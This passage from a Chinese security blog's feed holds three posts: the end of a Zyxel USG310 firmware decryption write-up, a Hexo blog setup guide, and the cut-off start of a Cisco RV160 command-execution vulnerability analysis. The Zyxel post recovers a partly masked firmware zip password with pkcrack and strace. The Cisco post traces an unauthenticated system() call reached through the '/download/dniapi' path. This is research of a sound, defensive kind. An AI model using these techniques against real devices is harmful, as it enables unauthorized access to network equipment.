class="hljs-params">(2423c9bb7b21b8c347cb898b)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtp_image/cloud_checksum <span class="hljs-params">(5dd7bf2962fa3637a954898b)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtp_image/nwa5123-ac <span class="hljs-params">(3d4ca00fc39c85554711878b)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtp_image/nwa5123-ac-hd <span class="hljs-params">(fb86ad6cc45e1e0a12e9888b)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtp_image/wtpinfo <span class="hljs-params">(298480fe98ba3898b2b3888b)</span><span class="hljs-string">...</span> OK!<br>Decrypting wtpinfo <span class="hljs-params">(9deeef6c027ef4bd1420888b)</span><span class="hljs-string">...</span> OK<br><br></code></pre></td></tr></table></figure><p>成功解开zip 文件。其实为什么470AAJ0C0.conf 文件不能爆破，我解开之后，大概的看了一下system-default.conf文件，这两个文件的内容是大概是一模一样的，没仔细找，那多出的一个字节是啥。</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531100827634-1654092501169.png" alt="image-20220531100827634"></p><h2 id="0x05-提取文件系统"><a href="#0x05-提取文件系统" class="headerlink" title="0x05 提取文件系统"></a>0x05 提取文件系统</h2><p>查看compress.img 的文件格式，可以看到这是Squashfs </p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601213159701-1654092512813.png" alt="image-20220601213159701"></p><p>解开之后整个文件目录结构</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">├── _470AAPJ0C0<span class="hljs-selector-class">.ri</span><span class="hljs-selector-class">.extracted</span><br>│   └── _240<span class="hljs-selector-class">.extracted</span><br>│       ├── cpio-root<br>│       └── etc<br>├── _compress<span class="hljs-selector-class">.img</span><span class="hljs-selector-class">.extracted</span><br>│   └── squashfs-root<br>│       ├── bin<br>│       ├── dev<br>│       ├── etc<br>│       ├── lib<br>│       ├── lib32 -&gt; lib/<br>│       ├── lib64<br>│       ├── sbin<br>│       ├── usr<br>│       ├── util<br>│       └── <span class="hljs-selector-tag">var</span><br>├── db<br>│   └── etc<br>│       └── zyxel<br>├── etc_writable<br>│   ├── budget<br>│   ├── ModemManager<br>│   ├── usb_modeswitch<br>│   └── zyxel<br>│       ├── conf<br>│       ├── coredump_script<br>│       ├── printer<br>│       ├── secuextender<br>│       └── selector<br>└── wtp_image<br><br></code></pre></td></tr></table></figure><h2 id="0x06-zld-fsextract-解开固件"><a href="#0x06-zld-fsextract-解开固件" class="headerlink" title="0x06 zld_fsextract 解开固件"></a>0x06 zld_fsextract 解开固件</h2><p>关于 zld_fsextract 的讲解，原文讲的很详细了，这里就复现一下</p><p><a href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle">tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_470AAPJ0C0.ri.extracted [1]&gt; chmod -R 777  ./</span>_240.extracted/<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_/</span>_240.extracted&gt; <span class="hljs-keyword">file</span> zld_fsextract <br>zld_fsextract: ELF <span class="hljs-number">32</span>-bit MSB executable, MIPS, N32 MIPS64 rel2 version <span class="hljs-number">1</span> (SYSV), statically linked, stripped<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_/</span>_240.extracted&gt; which qemu-mipsn32-<span class="hljs-keyword">static</span> <br><span class="hljs-regexp">/usr/</span>bin/qemu-mipsn32-<span class="hljs-keyword">static</span><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_/</span>_240.extracted&gt; cp <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/qemu-mipsn32-static  ./</span><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_/</span>_240.extracted&gt; chmod <span class="hljs-number">777</span> qemu-mipsn32-<span class="hljs-keyword">static</span> <br>tigerortiger@ubuntu ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/z/</span>f<span class="hljs-regexp">/_/</span>_240.extracted&gt; <br>sudo strace -f -s <span class="hljs-number">199</span> qemu-mipsn32-<span class="hljs-keyword">static</span> .<span class="hljs-regexp">/zld_fsextract ../</span>..<span class="hljs-regexp">/470AAPJ0C0.bin  ./u</span>nzip -s extract -e code<br>[sudo] password <span class="hljs-keyword">for</span> tigerortiger: <br>execve(<span class="hljs-string">&quot;/usr/bin/qemu-mipsn32-static&quot;</span>, [<span class="hljs-string">&quot;qemu-mipsn32-static&quot;</span>, <span class="hljs-string">&quot;./zld_fsextract&quot;</span>, <span class="hljs-string">&quot;../../470AAPJ0C0.bin&quot;</span>, <span class="hljs-string">&quot;./unzip&quot;</span>, <span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;extract&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>], <span class="hljs-number">0</span>x7fffa6cc8d20 <span class="hljs-comment">/* 17 vars */</span>) = <span class="hljs-number">0</span><br>brk(<span class="hljs-keyword">NULL</span>)                               = <span class="hljs-number">0</span>x62813000<br>brk(<span class="hljs-number">0</span>x62814280)                         = <span class="hljs-number">0</span>x62814280<br>arch_prctl(ARCH_SET_FS, <span class="hljs-number">0</span>x62813940)     = <span class="hljs-number">0</span><br>uname(&#123;sysname=<span class="hljs-string">&quot;Linux&quot;</span>, nodename=<span class="hljs-string">&quot;ubuntu&quot;</span>, ...&#125;) = <span class="hljs-number">0</span><br>set_tid_address(<span class="hljs-number">0</span>x62813c10)             = <span class="hljs-number">64399</span><br>set_robust_list(<span class="hljs-number">0</span>x62813c20, <span class="hljs-number">24</span>)         = <span class="hljs-number">0</span><br>rt_sigaction(SIGRTMIN, &#123;sa_handler=<span class="hljs-number">0</span>x6014ccc0, sa_mask=[], s<br>...<br>[pid  <span class="hljs-number">3040</span>] wait4(-<span class="hljs-number">1</span>, strace: Process <span class="hljs-number">3048</span> attached<br> &lt;unfinished ...&gt;<br>[pid  <span class="hljs-number">3048</span>] set_robust_list(<span class="hljs-number">0</span>x64384c20, <span class="hljs-number">24</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], ~[KILL STOP RTMIN RT_1], <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] clone(child_stack=<span class="hljs-number">0</span>x7fd85d2dcdb0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=<span class="hljs-number">0</span>x7fd85d2dd9d0, tls=<span class="hljs-number">0</span>x7fd85d2dd700, child_tidptr=<span class="hljs-number">0</span>x7fd85d2dd9d0) = <span class="hljs-number">3049</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigprocmask(SIG_SETMASK, ~[KILL STOP RTMIN RT_1], <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigprocmask(SIG_SETMASK, [], <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] execve(<span class="hljs-string">&quot;./unzip&quot;</span>, [<span class="hljs-string">&quot;./unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;-q&quot;</span>, <span class="hljs-string">&quot;-P&quot;</span>, <span class="hljs-string">&quot;RvP5AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXFmhjdq.rqDqX.cPD9BG3eq/Y&quot;</span>, <span class="hljs-string">&quot;../../470AAPJ0C0.bin&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;db/etc/zyxel/ftp/conf/&quot;</span>, <span class="hljs-string">&quot;db/etc/zyxel/ftp/conf/system-default.conf&quot;</span>], <span class="hljs-number">0</span>x643d4b50 <span class="hljs-comment">/* 16 vars */</span>strace: Process <span class="hljs-number">3049</span> attached<br> &lt;unfinished ...&gt;<br>[pid  <span class="hljs-number">3049</span>] +++ exited with <span class="hljs-number">0</span> +++<br>[pid  <span class="hljs-number">3048</span>] &lt;... execve resumed&gt; )      = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] brk(<span class="hljs-keyword">NULL</span>)                   = <span class="hljs-number">0</span>x64372000<br>[pid  <span class="hljs-number">3048</span>] brk(<span class="hljs-number">0</span>x64373280)             = <span class="hljs-number">0</span>x64373280<br>[pid  <span class="hljs-number">3048</span>] arch_prctl(ARCH_SET_FS, <span class="hljs-number">0</span>x64372940) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] uname(&#123;sysname=<span class="hljs-string">&quot;Linux&quot;</span>, nodename=<span class="hljs-string">&quot;ubuntu&quot;</span>, ...&#125;) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] set_tid_address(<span class="hljs-number">0</span>x64372c10) = <span class="hljs-number">3048</span><br>[pid  <span class="hljs-number">3048</span>] set_robust_list(<span class="hljs-number">0</span>x64372c20, <span class="hljs-number">24</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigaction(SIGRTMIN, &#123;sa_handler=<span class="hljs-number">0</span>x60142520, sa_mask=[], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=<span class="hljs-number">0</span>x6014a9b0&#125;, <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigaction(SIGRT_1, &#123;sa_handler=<span class="hljs-number">0</span>x601425c0, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART|SA_SIGINFO, sa_restorer=<span class="hljs-number">0</span>x6014a9b0&#125;, <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], <span class="hljs-keyword">NULL</span>, <span class="hljs-number">8</span>) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] prlimit64(<span class="hljs-number">0</span>, RLIMIT_STACK, <span class="hljs-keyword">NULL</span>, &#123;rlim_cur=<span class="hljs-number">8192</span>*<span class="hljs-number">1024</span>, rlim_max=RLIM64_INFINITY&#125;) = <span class="hljs-number">0</span><br>[pid  <span class="hljs-number">3048</span>] readlink(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, <span class="hljs-string">&quot;/usr/bin/qemu-mips-static&quot;</span>, <span class="hljs-number">4096</span>) = <span class="hljs-number">25</span><br>[pid  <span class="hljs-number">3048</span>] brk(<span class="hljs-number">0</span>x64394280)             = <span class="hljs-number">0</span>x64394280<br></code></pre></td></tr></table></figure><p>主要是查看这一句,密钥有一部分我就不公布了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[pid  3048]</span> <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;./unzip&quot;</span>, <span class="hljs-selector-attr">[<span class="hljs-string">&quot;./unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;-q&quot;</span>, <span class="hljs-string">&quot;-P&quot;</span>, <span class="hljs-string">&quot;RvP5AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXFmhjdq.rqDqX.cPD9BG3eq/Y&quot;</span>, <span class="hljs-string">&quot;../../470AAPJ0C0.bin&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;db/etc/zyxel/ftp/conf/&quot;</span>, <span class="hljs-string">&quot;db/etc/zyxel/ftp/conf/system-default.conf&quot;</span>]</span>, <br></code></pre></td></tr></table></figure><p>最终用整个密钥也可以解开470AAPJ0C0.bin</p><p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601214513234.png" alt="image-20220601214513234"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这个固件解密的方式主要用的方式pkcrack，利用的就是一个未加密的conf文件，进行解密，总的来说，在分析加密固件的时候，应该对那些伴随加密固件一起发布出来的其他文件进行详细的信息收集，以便了解更多与固件相关的信息，另外，加密固件在更新到设备上的时候，是需要解密后提取文件系统才能使用的，如果设备上原本是没有密钥或者生成密钥的算法，那么解密的密钥或者解密的方式大概率会和加密固件一起发布出来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>github 博客搭建记录</title>
    <link href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="安装npm"><a href="#安装npm" class="headerlink" title="安装npm"></a>安装npm</h3><p>下载nodejs<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215142420966.png"></p><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215142511277.png"></p><h3 id="下载Hexo"><a href="#下载Hexo" class="headerlink" title="下载Hexo"></a>下载Hexo</h3><p>安装命令：npm install hexo -g<br>ps： 下载会失败，更改镜像为淘宝的npm镜像站。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145400750.png"><br>安装成功<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145459306.png"></p><h3 id="安装hexo-依赖"><a href="#安装hexo-依赖" class="headerlink" title="安装hexo 依赖"></a>安装hexo 依赖</h3><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145617081.png"></p><h3 id="把ssh-key-的-pub-公钥"><a href="#把ssh-key-的-pub-公钥" class="headerlink" title="把ssh key 的 pub 公钥"></a>把ssh key 的 pub 公钥</h3><p>把ssh key 的 pub 公钥 发送到github中<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215145905798.png"><br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215180007355.png"></p><p>验证ssh 是否能连接成功<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215150534676.png"></p><h3 id="hexo-init-初始化"><a href="#hexo-init-初始化" class="headerlink" title="hexo init 初始化"></a>hexo init 初始化</h3><p>hexo init 初始化，可能会报permitted<br>解决方法：<a href="https://blog.csdn.net/c327127960/article/details/116997142">https://blog.csdn.net/c327127960/article/details/116997142</a><br>修改1_blog 文件夹的user权限。</p><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215151951928.png"></p><p>生成静态网页<br>hexo g<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215152110309.png"></p><p>预览<br>hexo s<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215152319329.png"></p><h3 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h3><p>错误解决：这是因为没安装<code>hexo-deployer-git</code>插件，在<strong>站点目录</strong>下输入下面的插件安装就好了：</p><blockquote><p>npm install hexo-deployer-git –save<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215153413338.png"></p></blockquote><p>部署  hexo -d</p><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215153513684.png"></p><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215154313076.png"><br>可以访问到了<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215154324906.png"></p><h3 id="更改主题"><a href="#更改主题" class="headerlink" title="更改主题"></a>更改主题</h3><h4 id="更改titile"><a href="#更改titile" class="headerlink" title="更改titile"></a>更改titile</h4><p><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215155927803.png"></p><p>提交修改</p><blockquote><p>hexo clean<br>hexo g<br>hexo d</p></blockquote><h4 id="更改主题-1"><a href="#更改主题-1" class="headerlink" title="更改主题"></a>更改主题</h4><p>下载<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160852822.png"><br>更改<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160940638.png"></p><p>主题<br>问题： 是因为有的东西还没加载，等一等就好了。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215160908093.png"><br>使用Coder<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215165339843.png"></p><h2 id="编写博客"><a href="#编写博客" class="headerlink" title="编写博客"></a>编写博客</h2><h3 id="上传md"><a href="#上传md" class="headerlink" title="上传md"></a>上传md</h3><p>把写好的md 复制到_post文件夹中。<br>需要先用记事本打开md，加上titile<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175541083.png"></p><p>然后</p><blockquote><p>hexo clean<br>hexo g<br>hexo d</p></blockquote><p>刷新查看<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215172256746.png"></p><p>但是图片显示不出来</p><h3 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h3><p>改为true<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175200901.png"></p><p>下载  </p><blockquote><p>npm install <a href="https://github.com/CodeFalling/hexo-asset-image">https://github.com/CodeFalling/hexo-asset-image</a> –save</p></blockquote><p>图片目录，图片目录不能有空格。<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175304128.png"><br>更改md图片路径<br><img src="/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20231215175329575.png"></p><p>Cactus<br><a href="https://link.zhihu.com/?target=https://github.com/probberechts/hexo-theme-cactus">https://link.zhihu.com/?target=https%3A//github.com/probberechts/hexo-theme-cactus</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cisco Rv160 远程命令执行漏洞分析</title>
    <link href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="Cisco-Rv160-远程命令执行"><a href="#Cisco-Rv160-远程命令执行" class="headerlink" title="Cisco Rv160 远程命令执行"></a>Cisco Rv160 远程命令执行</h1><h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><p><a href="https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html">https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-rv160-260-rce-XZeFkNHf.html</a></p><h2 id="0x02-固件解包"><a href="#0x02-固件解包" class="headerlink" title="0x02 固件解包"></a>0x02 固件解包</h2><p>解开固件包，定位到mini_httpd 的web 组件</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102701684.png" alt="image-20211202102701684"></p><p>arm 架构</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202102835220.png" alt="image-20211202102835220"></p><p>根据httpd 检索出了两个文件。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202103921752.png" alt="image-20211202103921752"></p><h2 id="0x03-mini-httpd-分析"><a href="#0x03-mini-httpd-分析" class="headerlink" title="0x03 mini_httpd 分析"></a>0x03 mini_httpd 分析</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p> 在进行IDA 分析cisco 160W 0.1 版本的mini_httpd 时，遇到了如下问题，但是并不影响反汇编F5。</p><p>根据网上查阅的信息来看，这是因为栈帧不平衡，需要手动调整栈帧。</p><p><a href="https://www.cnblogs.com/DorinXL/p/13657972.html">https://www.cnblogs.com/DorinXL/p/13657972.html</a></p><p><a href="https://blog.csdn.net/feibabeibei_beibei/article/details/85238676">https://blog.csdn.net/feibabeibei_beibei/article/details/85238676</a></p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202110226642.png" alt="image-20211202110226642"></p><h3 id="mini-httpd-分析"><a href="#mini-httpd-分析" class="headerlink" title="mini_httpd 分析"></a>mini_httpd 分析</h3><p>分析这个漏洞的时候，我并没有很仔细的查看漏洞相关分析文章，而是直接解开固件，进行分析，抱着一种如果当时是自己在分析这个固件，应该会从哪个方面入手的想法，是否可以发现漏洞点和漏洞触发的方式。</p><p>接下来我将分享我对这个漏洞分析的逻辑与思路，首先我将mini_httpd 组件放入到IDA中，在逆向分析的过程中，由于对mini_httpd 源码已经大致看过了，因此，我对mini_httpd 组件的中的反汇编代码依次进行分析。</p><p>根据上面的截图的 _libc_start_main()函数的定义，可以确定 mian 参数是 mini_httpd中的main 函数。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144010024.png" alt="image-20211202144010024"></p><p>根据mini_httpd组件中mini_httpd.c 的源码和本固件的mini_httpd 来对比，sub_11FA0() 函数就是mini_httpd.c 中的mian()函数。</p><p>进入到sub_11FA0()函数中，可以看到mini_httpd 的版本是1.27的。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202144838659.png" alt="image-20211202144838659"></p><p>在函数的底部找到了处理 进程的 handle_request() 函数。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202223259036.png" alt="image-20211202223259036"></p><p>进入到handle_request，我根据mini_httpd.c 的源代码对比反汇编出来的handle_request 函数进行比对，找出mini_httpd中开发者二次开发的代码。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202224312529.png" alt="image-20211202224312529"></p><p>根据 mini_httpd.c 中的hand_request() 函数源码来看，mini_httpd 反汇编出来的代码并没有 do_dir() 函数。</p><p>在跟进了mini_httpd.c 中的do_dir()函数的代码后，do_dir()函数通过调用auth_check()函数处理当前访问的文件路径是否符合访问权限。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202230935935.png" alt="image-20211202230935935"></p><p>进入到 do_file() 函数中，这个函数有两个要值得注意的点，首先在mini_http.c 源代码中，有一个auth_check()函数，该函数适用于对文件进行权限认证的函数，只有经过权限认证后，才能访问其他的文件，但是在Cisco RV160 的组件Mini_httpd的反汇编代码do_file()并没有这个函数，因此埋下了后面不需要认证即可出发漏洞的隐患。另一个是sub_1A58() 函数，这个函数在min_httpd.c中并不真实存在，因而这个函数是开发者二次开发留下的代码，传入dword_35164 的值作为参数。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211202233311868.png" alt="image-20211202233311868"></p><p>进入到sub_1AF58() 函数，该函数最终会将传入的dword_35164的值给v5, 然后将格式化的字符串调用system 函数进行执行。</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206220714253.png" alt="image-20211206220714253"></p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据前面的Cisco Rv160W 固件中mini_httpd和mini_httpd.c 源代码进行比对分析。在sub_1AF58() 函数中存在执行命令的漏洞，并且需要到达漏洞函数sub_1AF58()，函数的参数dword_35164 中要有 “ download&#x2F; “  字符串，才能跳转到do_file() 函数</p><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222751530.png" alt="image-20211206222751530"></p><p>接个根据参数往上一层追溯，该函数的参数dword_35164 中要有 “ dniapi&#x2F; “  字符串，才能跳转到do_file() 函数，根据上面strncmp函数，可以判定参数的格式为”&#x2F;download&#x2F;dniapi”</p><blockquote><p><strong>char *strstr(const char *haystack, const char *needle)</strong> 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p></blockquote><p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211206222553826.png" alt="image-20211206222553826"></p><p>在dword_34F60 的值将赋值给dword_35164。</p><p><img 